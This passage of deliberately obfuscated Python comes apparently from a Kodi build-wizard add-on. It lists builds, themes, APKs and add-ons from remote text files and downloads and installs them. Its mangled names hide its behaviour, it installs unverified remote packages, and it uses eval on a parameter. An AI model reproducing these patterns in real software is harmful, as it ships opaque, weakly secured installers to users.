								addDir ('[%s] %s (v%s)'%(float (OO00OO0OO00000OO0 ),O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ),'viewbuild',O00OO0O000O0OO0O0 ,description =OO0000O00OOO00000 ,fanart =OOO0O00OOOOO0O0OO ,icon =OO0OO00OO000OO0O0 ,menu =O0O0O00O0OOOOOO0O ,themeit =THEME2 )#line:2068
				if OOOOOOO00O00OO0OO >0 :#line:2069
					OOO00OOO0OOO0OO0O ='+'if SHOW15 =='false'else '-'#line:2070
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO00OOO0OOO0OO0O ,OOOOOOO00O00OO0OO ),'togglesetting','show15',themeit =THEME3 )#line:2071
					if SHOW15 =='true':#line:2072
						for O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ,OOO000OOO0000O0O0 ,OO0O0OOO000OO0000 ,OO00OO0OO00000OO0 ,OO0000O0O0OO00OOO ,OO0OO00OO000OO0O0 ,OOO0O00OOOOO0O0OO ,OO0O0OO0OO0OOOO0O ,OO0000O00OOO00000 in O00OO00OOO00OO000 :#line:2073
							if not SHOWADULT =='true'and OO0O0OO0OO0OOOO0O .lower ()=='yes':continue #line:2074
							if not DEVELOPER =='true'and wiz .strTest (O00OO0O000O0OO0O0 ):continue #line:2075
							O000O00OOOO000O0O =int (float (OO00OO0OO00000OO0 ))#line:2076
							if O000O00OOOO000O0O <=15 :#line:2077
								O0O0O00O0OOOOOO0O =createMenu ('install','',O00OO0O000O0OO0O0 )#line:2078
								addDir ('[%s] %s (v%s)'%(float (OO00OO0OO00000OO0 ),O00OO0O000O0OO0O0 ,OOO00000OO0000OOO ),'viewbuild',O00OO0O000O0OO0O0 ,description =OO0000O00OOO00000 ,fanart =OOO0O00OOOOO0O0OO ,icon =OO0OO00OO000OO0O0 ,menu =O0O0O00O0OOOOOO0O ,themeit =THEME2 )#line:2079
		elif O0OOOO0OO0OO0O00O >0 :#line:2080
			if OO0OO0O00000OO0OO >0 :#line:2081
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2082
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2083
			else :#line:2084
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2085
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2086
	setView ('files','viewType')#line:2087
def viewBuild (OO0OOOO0OO0OOO0O0 ):#line:2089
	O000O000OO00O0O00 =wiz .workingURL (SPEEDFILE )#line:2090
	if not O000O000OO00O0O00 ==True :#line:2091
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2092
		addFile ('%s'%O000O000OO00O0O00 ,'',themeit =THEME3 )#line:2093
		return #line:2094
	if wiz .checkBuild (OO0OOOO0OO0OOO0O0 ,'version')==False :#line:2095
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2096
		addFile ('%s was not found in the builds list.'%OO0OOOO0OO0OOO0O0 ,'',themeit =THEME3 )#line:2097
		return #line:2098
	OO0O00OO00OO0O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2099
	O00O000OO00OOO0OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OOOO0OO0OOO0O0 ).findall (OO0O00OO00OO0O0OO )#line:2100
	for O00O00OOOOO0OO0OO ,OOO0O0000OOO00OO0 ,O00OO00O00OO00OOO ,O00O0O00OO0000O0O ,OO00OOOOOO0OOO0O0 ,O000OOOOO0O0OO0OO ,OO0OOO0OO0OOO00OO ,O00OO00OO0O0000O0 ,OO0OO00O0O0000O0O ,OO000000000O0O000 in O00O000OO00OOO0OO :#line:2101
		O000OOOOO0O0OO0OO =O000OOOOO0O0OO0OO if wiz .workingURL (O000OOOOO0O0OO0OO )else ICON #line:2102
		OO0OOO0OO0OOO00OO =OO0OOO0OO0OOO00OO if wiz .workingURL (OO0OOO0OO0OOO00OO )else FANART #line:2103
		OOOOO0OOOO00O0O0O ='%s (v%s)'%(OO0OOOO0OO0OOO0O0 ,O00O00OOOOO0OO0OO )#line:2104
		if BUILDNAME ==OO0OOOO0OO0OOO0O0 and O00O00OOOOO0OO0OO >BUILDVERSION :#line:2105
			OOOOO0OOOO00O0O0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOOO0OOOO00O0O0O ,BUILDVERSION )#line:2106
		OO0OOOOOOO0OO0000 =int (float (KODIV ));OOO000OOOO00OO0OO =int (float (O00O0O00OO0000O0O ))#line:2115
		if not OO0OOOOOOO0OO0000 ==OOO000OOOO00OO0OO :#line:2116
			if OO0OOOOOOO0OO0000 ==16 and OOO000OOOO00OO0OO <=15 :O00O00O00O0O0OO00 =False #line:2117
			else :O00O00O00O0O0OO00 =True #line:2118
		else :O00O00O00O0O0OO00 =False #line:2119
		addFile ('התקנה','install',OO0OOOO0OO0OOO0O0 ,'fresh',description =OO000000000O0O000 ,fanart =OO0OOO0OO0OOO00OO ,icon =O000OOOOO0O0OO0OO ,themeit =THEME1 )#line:2123
		if not OO00OOOOOO0OOO0O0 =='http://':#line:2126
			if wiz .workingURL (OO00OOOOOO0OOO0O0 )==True :#line:2127
				addFile (wiz .sep ('THEMES'),'',fanart =OO0OOO0OO0OOO00OO ,icon =O000OOOOO0O0OO0OO ,themeit =THEME3 )#line:2128
				OO0O00OO00OO0O0OO =wiz .openURL (OO00OOOOOO0OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2129
				O00O000OO00OOO0OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0O00OO00OO0O0OO )#line:2130
				for OOOO0O00000OO00OO ,OO0000O0OOO0O0O0O ,O00OO0O0O0OO0000O ,OOOO00O0O0OOO0OOO ,O00OO00O00O00000O ,OO000000000O0O000 in O00O000OO00OOO0OO :#line:2131
					if not SHOWADULT =='true'and O00OO00O00O00000O .lower ()=='yes':continue #line:2132
					O00OO0O0O0OO0000O =O00OO0O0O0OO0000O if O00OO0O0O0OO0000O =='http://'else O000OOOOO0O0OO0OO #line:2133
					OOOO00O0O0OOO0OOO =OOOO00O0O0OOO0OOO if OOOO00O0O0OOO0OOO =='http://'else OO0OOO0OO0OOO00OO #line:2134
					addFile (OOOO0O00000OO00OO if not OOOO0O00000OO00OO ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOOO0O00000OO00OO ,'theme',OO0OOOO0OO0OOO0O0 ,OOOO0O00000OO00OO ,description =OO000000000O0O000 ,fanart =OOOO00O0O0OOO0OOO ,icon =O00OO0O0O0OO0000O ,themeit =THEME3 )#line:2135
	setView ('files','viewType')#line:2136
def viewThirdList (OO0OOOO0O00O0OO00 ):#line:2138
	OO0OOOOO0OOO000OO =eval ('THIRD%sNAME'%OO0OOOO0O00O0OO00 )#line:2139
	O0O00OOO0OOOO0000 =eval ('THIRD%sURL'%OO0OOOO0O00O0OO00 )#line:2140
	OOOOO0O00OO0O00OO =wiz .workingURL (O0O00OOO0OOOO0000 )#line:2141
	if not OOOOO0O00OO0O00OO ==True :#line:2142
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2143
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2144
	else :#line:2145
		OOOOOOOO0O0000O0O ,O00OOO000000O0O0O =wiz .thirdParty (O0O00OOO0OOOO0000 )#line:2146
		addFile ("[B]%s[/B]"%OO0OOOOO0OOO000OO ,'',themeit =THEME3 )#line:2147
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2148
		if OOOOOOOO0O0000O0O :#line:2149
			for OO0OOOOO0OOO000OO ,OOO00O000O0O0OO00 ,O0O00OOO0OOOO0000 ,OO000OO00O00OOO00 ,O0OOO00O0OO0000O0 ,O00OO00O00OOOOO0O ,O00O00000OO0O0O0O ,O00O0O0OOOOO0O0O0 in O00OOO000000O0O0O :#line:2150
				if not SHOWADULT =='true'and O00O00000OO0O0O0O .lower ()=='yes':continue #line:2151
				addFile ("[%s] %s v%s"%(OO000OO00O00OOO00 ,OO0OOOOO0OOO000OO ,OOO00O000O0O0OO00 ),'installthird',OO0OOOOO0OOO000OO ,O0O00OOO0OOOO0000 ,icon =O0OOO00O0OO0000O0 ,fanart =O00OO00O00OOOOO0O ,description =O00O0O0OOOOO0O0O0 ,themeit =THEME2 )#line:2152
		else :#line:2153
			for OO0OOOOO0OOO000OO ,O0O00OOO0OOOO0000 ,O0OOO00O0OO0000O0 ,O00OO00O00OOOOO0O ,O00O0O0OOOOO0O0O0 in O00OOO000000O0O0O :#line:2154
				addFile (OO0OOOOO0OOO000OO ,'installthird',OO0OOOOO0OOO000OO ,O0O00OOO0OOOO0000 ,icon =O0OOO00O0OO0000O0 ,fanart =O00OO00O00OOOOO0O ,description =O00O0O0OOOOO0O0O0 ,themeit =THEME2 )#line:2155
def editThirdParty (OO000O0000OO0OO0O ):#line:2157
	OO0OO0O00O00O0OO0 =eval ('THIRD%sNAME'%OO000O0000OO0OO0O )#line:2158
	OOO00OOOO0O000000 =eval ('THIRD%sURL'%OO000O0000OO0OO0O )#line:2159
	O00OOOO00OOOOO0OO =wiz .getKeyboard (OO0OO0O00O00O0OO0 ,'Enter the Name of the Wizard')#line:2160
	OO00O0O00OO000000 =wiz .getKeyboard (OOO00OOOO0O000000 ,'Enter the URL of the Wizard Text')#line:2161
	wiz .setS ('wizard%sname'%OO000O0000OO0OO0O ,O00OOOO00OOOOO0OO )#line:2163
	wiz .setS ('wizard%surl'%OO000O0000OO0OO0O ,OO00O0O00OO000000 )#line:2164
def apkScraper (name =""):#line:2166
	if name =='kodi':#line:2167
		O000OO00O00O0OOO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2168
		O0000O0OO000OOO0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2169
		O000OO00OOOOOO000 =wiz .openURL (O000OO00O00O0OOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2170
		O0OO000O0O0O0O0O0 =wiz .openURL (O0000O0OO000OOO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2171
		OO0O00OO00O0O0OO0 =0 #line:2172
		OO00OO00O00O0O0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO00OOOOOO000 )#line:2173
		OOO0O000000OOOOO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0OO000O0O0O0O0O0 )#line:2174
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2176
		OO0O000000O000O00 =False #line:2177
		for OOOOOOO0OO0OOOO0O ,name ,O0O00O0OOO0OO00O0 ,OOO0O000000O00OOO in OO00OO00O00O0O0O0 :#line:2178
			if OOOOOOO0OO0OOOO0O in ['../','old/']:continue #line:2179
			if not OOOOOOO0OO0OOOO0O .endswith ('.apk'):continue #line:2180
			if not OOOOOOO0OO0OOOO0O .find ('_')==-1 and OO0O000000O000O00 ==True :continue #line:2181
			try :#line:2182
				OOOO0O00OOOOOO0OO =name .split ('-')#line:2183
				if not OOOOOOO0OO0OOOO0O .find ('_')==-1 :#line:2184
					OO0O000000O000O00 =True #line:2185
					O00OO0O0O000OOOO0 ,O0OOOO00O0000OO0O =OOOO0O00OOOOOO0OO [2 ].split ('_')#line:2186
				else :#line:2187
					O00OO0O0O000OOOO0 =OOOO0O00OOOOOO0OO [2 ]#line:2188
					O0OOOO00O0000OO0O =''#line:2189
				OOO0OO0O0O0OOOO0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O00OOOOOO0OO [0 ].title (),OOOO0O00OOOOOO0OO [1 ],O0OOOO00O0000OO0O .upper (),O00OO0O0O000OOOO0 ,COLOR2 ,O0O00O0OOO0OO00O0 .replace (' ',''),COLOR1 ,OOO0O000000O00OOO )#line:2190
				O000000O0O0000OOO =urljoin (O000OO00O00O0OOO0 ,OOOOOOO0OO0OOOO0O )#line:2191
				addFile (OOO0OO0O0O0OOOO0O ,'apkinstall',"%s v%s%s %s"%(OOOO0O00OOOOOO0OO [0 ].title (),OOOO0O00OOOOOO0OO [1 ],O0OOOO00O0000OO0O .upper (),O00OO0O0O000OOOO0 ),O000000O0O0000OOO )#line:2192
				OO0O00OO00O0O0OO0 +=1 #line:2193
			except :#line:2194
				wiz .log ("Error on: %s"%name )#line:2195
		for OOOOOOO0OO0OOOO0O ,name ,O0O00O0OOO0OO00O0 ,OOO0O000000O00OOO in OOO0O000000OOOOO0 :#line:2197
			if OOOOOOO0OO0OOOO0O in ['../','old/']:continue #line:2198
			if not OOOOOOO0OO0OOOO0O .endswith ('.apk'):continue #line:2199
			if not OOOOOOO0OO0OOOO0O .find ('_')==-1 :continue #line:2200
			try :#line:2201
				OOOO0O00OOOOOO0OO =name .split ('-')#line:2202
				OOO0OO0O0O0OOOO0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O00OOOOOO0OO [0 ].title (),OOOO0O00OOOOOO0OO [1 ],OOOO0O00OOOOOO0OO [2 ],COLOR2 ,O0O00O0OOO0OO00O0 .replace (' ',''),COLOR1 ,OOO0O000000O00OOO )#line:2203
				O000000O0O0000OOO =urljoin (O0000O0OO000OOO0O ,OOOOOOO0OO0OOOO0O )#line:2204
				addFile (OOO0OO0O0O0OOOO0O ,'apkinstall',"%s v%s %s"%(OOOO0O00OOOOOO0OO [0 ].title (),OOOO0O00OOOOOO0OO [1 ],OOOO0O00OOOOOO0OO [2 ]),O000000O0O0000OOO )#line:2205
				OO0O00OO00O0O0OO0 +=1 #line:2206
			except :#line:2207
				wiz .log ("Error on: %s"%name )#line:2208
		if OO0O00OO00O0O0OO0 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2209
	elif name =='spmc':#line:2210
		O0OO00OOO0O0O00OO ='https://github.com/koying/SPMC/releases'#line:2211
		O000OO00OOOOOO000 =wiz .openURL (O0OO00OOO0O0O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2212
		OO0O00OO00O0O0OO0 =0 #line:2213
		OO00OO00O00O0O0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O000OO00OOOOOO000 )#line:2214
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2216
		for name ,O0OOOOOOO0OO0OO00 in OO00OO00O00O0O0O0 :#line:2218
			O0OO00O0O0OO0000O =''#line:2219
			OOO0O000000OOOOO0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OOOOOOO0OO0OO00 )#line:2220
			for O0O00O00000000OOO ,O000O0OOO0OOO000O ,O00OOOO0000O00000 in OOO0O000000OOOOO0 :#line:2221
				if O00OOOO0000O00000 .find ('armeabi')==-1 :continue #line:2222
				if O00OOOO0000O00000 .find ('launcher')>-1 :continue #line:2223
				O0OO00O0O0OO0000O =urljoin ('https://github.com',O0O00O00000000OOO )#line:2224
				break #line:2225
		if OO0O00OO00O0O0OO0 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2227
def apkMenu (url =None ):#line:2229
	if url ==None :#line:2230
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2233
	if not APKFILE =='http://':#line:2234
		if url ==None :#line:2235
			OO0O00OOOO000OOOO =wiz .workingURL (APKFILE )#line:2236
			O000OOO0OOO0O0OO0 =uservar .APKFILE #line:2237
		else :#line:2238
			OO0O00OOOO000OOOO =wiz .workingURL (url )#line:2239
			O000OOO0OOO0O0OO0 =url #line:2240
		if OO0O00OOOO000OOOO ==True :#line:2241
			OOO0O0O00OO0O00OO =wiz .openURL (O000OOO0OOO0O0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2242
			OO0000OO0O0O0O0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO0O0O00OO0O00OO )#line:2243
			if len (OO0000OO0O0O0O0O0 )>0 :#line:2244
				OOOOOOOOOOO0OO0O0 =0 #line:2245
				for O0000O0O00O0O0OOO ,O0O0O000O000000OO ,url ,O0O00OO0O000OO00O ,OOO00OOOOO000O0OO ,OO000OOO0O00OOO0O ,OOO0OO0O0000O0OO0 in OO0000OO0O0O0O0O0 :#line:2246
					if not SHOWADULT =='true'and OO000OOO0O00OOO0O .lower ()=='yes':continue #line:2247
					if O0O0O000O000000OO .lower ()=='yes':#line:2248
						OOOOOOOOOOO0OO0O0 +=1 #line:2249
						addDir ("[B]%s[/B]"%O0000O0O00O0O0OOO ,'apk',url ,description =OOO0OO0O0000O0OO0 ,icon =O0O00OO0O000OO00O ,fanart =OOO00OOOOO000O0OO ,themeit =THEME3 )#line:2250
					else :#line:2251
						OOOOOOOOOOO0OO0O0 +=1 #line:2252
						addFile (O0000O0O00O0O0OOO ,'apkinstall',O0000O0O00O0O0OOO ,url ,description =OOO0OO0O0000O0OO0 ,icon =O0O00OO0O000OO00O ,fanart =OOO00OOOOO000O0OO ,themeit =THEME2 )#line:2253
					if OOOOOOOOOOO0OO0O0 <1 :#line:2254
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2255
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2256
		else :#line:2257
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2258
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2259
			addFile ('%s'%OO0O00OOOO000OOOO ,'',themeit =THEME3 )#line:2260
		return #line:2261
	else :wiz .log ("[APK Menu] No APK list added.")#line:2262
	setView ('files','viewType')#line:2263
def addonMenu (url =None ):#line:2265
	if not ADDONFILE =='http://':#line:2266
		if url ==None :#line:2267
			OO0O000O0O0O0OOO0 =wiz .workingURL (ADDONFILE )#line:2268
			OO0OOOO0OOO000OOO =uservar .ADDONFILE #line:2269
		else :#line:2270
			OO0O000O0O0O0OOO0 =wiz .workingURL (url )#line:2271
			OO0OOOO0OOO000OOO =url #line:2272
		if OO0O000O0O0O0OOO0 ==True :#line:2273
			O0OOOOOOO0OO00O0O =wiz .openURL (OO0OOOO0OOO000OOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2274
			O0OOOO00OO0OO0000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OOOOOOO0OO00O0O )#line:2275
			if len (O0OOOO00OO0OO0000 )>0 :#line:2276
				OO000000O0O0O00O0 =0 #line:2277
				for O00OOO00OO00O0O00 ,O0O0OOOO0O0O00OOO ,url ,O000OOOO0O0O00000 ,O000000OO00O0OOOO ,OO0O0O0OOO0O00O0O ,O000O0OO0O00OOOO0 ,O0OOO00000OO00O0O ,O0OOO0O0OO000O00O ,OOOO000O0OO000OOO in O0OOOO00OO0OO0000 :#line:2278
					if O0O0OOOO0O0O00OOO .lower ()=='section':#line:2279
						OO000000O0O0O00O0 +=1 #line:2280
						addDir ("[B]%s[/B]"%O00OOO00OO00O0O00 ,'addons',url ,description =OOOO000O0OO000OOO ,icon =O000O0OO0O00OOOO0 ,fanart =O0OOO00000OO00O0O ,themeit =THEME3 )#line:2281
					else :#line:2282
						if not SHOWADULT =='true'and O0OOO0O0OO000O00O .lower ()=='yes':continue #line:2283
						try :#line:2284
							O00O0OO0OOOOOOO0O =xbmcaddon .Addon (id =O0O0OOOO0O0O00OOO ).getAddonInfo ('path')#line:2285
							if os .path .exists (O00O0OO0OOOOOOO0O ):#line:2286
								O00OOO00OO00O0O00 ="[COLOR green][Installed][/COLOR] %s"%O00OOO00OO00O0O00 #line:2287
						except :#line:2288
							pass #line:2289
						OO000000O0O0O00O0 +=1 #line:2290
						addFile (O00OOO00OO00O0O00 ,'addoninstall',O0O0OOOO0O0O00OOO ,OO0OOOO0OOO000OOO ,description =OOOO000O0OO000OOO ,icon =O000O0OO0O00OOOO0 ,fanart =O0OOO00000OO00O0O ,themeit =THEME2 )#line:2291
					if OO000000O0O0O00O0 <1 :#line:2292
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2293
			else :#line:2294
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2295
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2296
		else :#line:2297
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2298
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2299
			addFile ('%s'%OO0O000O0O0O0OOO0 ,'',themeit =THEME3 )#line:2300
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2301
	setView ('files','viewType')#line:2302
def addonInstaller (OOOO00OOOOO000O0O ,OOO0OO000OOO000O0 ):#line:2304
	if not ADDONFILE =='http://':#line:2305
		O0O00O00O0OOO0OO0 =wiz .workingURL (OOO0OO000OOO000O0 )#line:2306
		if O0O00O00O0OOO0OO0 ==True :#line:2307
			O0O0000000OO000OO =wiz .openURL (OOO0OO000OOO000O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2308
			O0OO0O0O0O00000O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOO00OOOOO000O0O ).findall (O0O0000000OO000OO )#line:2309
			if len (O0OO0O0O0O00000O0 )>0 :#line:2310
				for O00O00OOO000000O0 ,OOO0OO000OOO000O0 ,O0O00000O0OOOO00O ,O000000OOO0000000 ,O00OO000O00O00000 ,O0OOO000O000OO0O0 ,OO0OO0O00OO000O0O ,O00O00OOOO0O0O0O0 ,O0O000OO0O0O0OO00 in O0OO0O0O0O00000O0 :#line:2311
					if os .path .exists (os .path .join (ADDONS ,OOOO00OOOOO000O0O )):#line:2312
						OO000O000OO000OOO =['Launch Addon','Remove Addon']#line:2313
						O00OO0OO000O000OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO000O000OO000OOO )#line:2314
						if O00OO0OO000O000OO ==0 :#line:2315
							wiz .ebi ('RunAddon(%s)'%OOOO00OOOOO000O0O )#line:2316
							xbmc .sleep (1000 )#line:2317
							return True #line:2318
						elif O00OO0OO000O000OO ==1 :#line:2319
							wiz .cleanHouse (os .path .join (ADDONS ,OOOO00OOOOO000O0O ))#line:2320
							try :wiz .removeFolder (os .path .join (ADDONS ,OOOO00OOOOO000O0O ))#line:2321
							except :pass #line:2322
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OOOO00OOOOO000O0O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2323
								removeAddonData (OOOO00OOOOO000O0O )#line:2324
							wiz .refresh ()#line:2325
							return True #line:2326
						else :#line:2327
							return False #line:2328
					O000O0OOOO0O0O0O0 =os .path .join (ADDONS ,O0O00000O0OOOO00O )#line:2329
					if not O0O00000O0OOOO00O .lower ()=='none'and not os .path .exists (O000O0OOOO0O0O0O0 ):#line:2330
						wiz .log ("Repository not installed, installing it")#line:2331
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OOOO00OOOOO000O0O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O00000O0OOOO00O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2332
							OOO0000O000000OOO =wiz .parseDOM (wiz .openURL (O000000OOO0000000 ),'addon',ret ='version',attrs ={'id':O0O00000O0OOOO00O })#line:2333
							if len (OOO0000O000000OOO )>0 :#line:2334
								O0O000O0OO00O000O ='%s%s-%s.zip'%(O00OO000O00O00000 ,O0O00000O0OOOO00O ,OOO0000O000000OOO [0 ])#line:2335
								wiz .log (O0O000O0OO00O000O )#line:2336
								if KODIV >=17 :wiz .addonDatabase (O0O00000O0OOOO00O ,1 )#line:2337
								installAddon (O0O00000O0OOOO00O ,O0O000O0OO00O000O )#line:2338
								wiz .ebi ('UpdateAddonRepos()')#line:2339
								wiz .log ("Installing Addon from Kodi")#line:2341
								O0OO000OO0OOOO00O =installFromKodi (OOOO00OOOOO000O0O )#line:2342
								wiz .log ("Install from Kodi: %s"%O0OO000OO0OOOO00O )#line:2343
								if O0OO000OO0OOOO00O :#line:2344
									wiz .refresh ()#line:2345
									return True #line:2346
							else :#line:2347
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0O00000O0OOOO00O )#line:2348
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OOOO00OOOOO000O0O ,O0O00000O0OOOO00O ))#line:2349
					elif O0O00000O0OOOO00O .lower ()=='none':#line:2350
						wiz .log ("No repository, installing addon")#line:2351
						O000OO00OOOO00000 =OOOO00OOOOO000O0O #line:2352
						O00O00O00O0OO0OO0 =OOO0OO000OOO000O0 #line:2353
						installAddon (OOOO00OOOOO000O0O ,OOO0OO000OOO000O0 )#line:2354
						wiz .refresh ()#line:2355
						return True #line:2356
					else :#line:2357
						wiz .log ("Repository installed, installing addon")#line:2358
						O0OO000OO0OOOO00O =installFromKodi (OOOO00OOOOO000O0O ,False )#line:2359
						if O0OO000OO0OOOO00O :#line:2360
							wiz .refresh ()#line:2361
							return True #line:2362
					if os .path .exists (os .path .join (ADDONS ,OOOO00OOOOO000O0O )):return True #line:2363
					O0O0OO000O0OO00O0 =wiz .parseDOM (wiz .openURL (O000000OOO0000000 ),'addon',ret ='version',attrs ={'id':OOOO00OOOOO000O0O })#line:2364
					if len (O0O0OO000O0OO00O0 )>0 :#line:2365
						OOO0OO000OOO000O0 ="%s%s-%s.zip"%(OOO0OO000OOO000O0 ,OOOO00OOOOO000O0O ,O0O0OO000O0OO00O0 [0 ])#line:2366
						wiz .log (str (OOO0OO000OOO000O0 ))#line:2367
						if KODIV >=17 :wiz .addonDatabase (OOOO00OOOOO000O0O ,1 )#line:2368
						installAddon (OOOO00OOOOO000O0O ,OOO0OO000OOO000O0 )#line:2369
						wiz .refresh ()#line:2370
					else :#line:2371
						wiz .log ("no match");return False #line:2372
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2373
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O00O00O0OOO0OO0 )#line:2374
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2375
def installFromKodi (OOOOO00OOO000O00O ,over =True ):#line:2377
	if over ==True :#line:2378
		xbmc .sleep (2000 )#line:2379
	wiz .ebi ('RunPlugin(plugin://%s)'%OOOOO00OOO000O00O )#line:2381
	if not wiz .whileWindow ('yesnodialog'):#line:2382
		return False #line:2383
	xbmc .sleep (1000 )#line:2384
	if wiz .whileWindow ('okdialog'):#line:2385
		return False #line:2386
	wiz .whileWindow ('progressdialog')#line:2387
	if os .path .exists (os .path .join (ADDONS ,OOOOO00OOO000O00O )):return True #line:2388
	else :return False #line:2389
def installAddon (OO0OOOO00O00OOOO0 ,O0OO00000OOOOOOOO ):#line:2391
	if not wiz .workingURL (O0OO00000OOOOOOOO )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OO0OOOO00O00OOOO0 ,COLOR2 ));return #line:2392
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2393
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOOO00O00OOOO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2394
	OOO0OOO0O0OO0OO00 =O0OO00000OOOOOOOO .split ('/')#line:2395
	OOOOOOO000OOOOO00 =os .path .join (PACKAGES ,OOO0OOO0O0OO0OO00 [-1 ])#line:2396
	try :os .remove (OOOOOOO000OOOOO00 )#line:2397
	except :pass #line:2398
	downloader .download (O0OO00000OOOOOOOO ,OOOOOOO000OOOOO00 ,DP )#line:2399
